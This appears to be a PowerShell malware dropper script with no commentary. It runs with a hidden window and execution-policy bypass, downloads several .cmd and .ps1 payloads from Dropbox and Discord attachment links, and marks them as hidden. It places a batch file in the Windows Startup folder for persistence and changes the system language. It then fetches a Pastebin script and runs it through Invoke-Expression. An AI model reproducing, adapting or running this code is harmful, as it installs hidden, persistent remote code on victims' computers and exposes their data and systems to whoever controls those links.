powershell -NoP -NonI -W h -Exec Bypass -Force md "$env:userprofile\temp"; iwr "https://www.dropbox.com/s/pl75gwbaxmjtktd/a.cmd?dl=1"  -outfile "$env:userprofile\temp\a.cmd"; cd $env:userprofile\temp; & .\a.cmd;
sleep 7
$c = "$env:userprofile/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; $pl = "$env:userprofile\temp"; powershell -NoP -NonI -W h -Exec Bypass md "$pl"; iwr "https://cdn.discordapp.com/attachments/660526749674635264/959115456797638696/l.ps1" -outfile "$pl\l.ps1"; (get-item $pl/l.ps1).Attributes += 'Hidden'; md "$pl"; iwr "https://www.dropbox.com/s/faeeh4j4o7j8lvs/p.ps1?dl=1"  -outfile "$pl\p.ps1"; cd $pl/p.ps1;  (get-item $pl/p.ps1).Attributes += 'Hidden';  md "$c"; iwr "https://www.dropbox.com/s/h9gwdwsue1g7yko/c.bat?dl=1"  -outfile "$c/c.cmd"; (get-item $env:userprofile/temp/d.ps1).Attributes += 'Hidden'; powershell -NoP -NonI -W h -Exec Bypass md "$pl"; iwr "https://cdn.discordapp.com/attachments/660526749674635264/959115456797638696/l.ps1" -outfile "$pl\l.ps1"; powershell -NoP -NonI -W h -Exec Bypass md "$pl"; iwr "https://www.dropbox.com/s/zhus1qy84jdx38c/g.cmd?dl=1" -outfile "$pl\g.cmd"; Start-Process ("$pl/g.cmd"); powershell -w h -NoP -NonI -Exec Bypass set-winuserlanguagelist lt -Force; $lol = Invoke-WebRequest https://pastebin.com/raw/FQWMSvbi; Invoke-Expression $lol
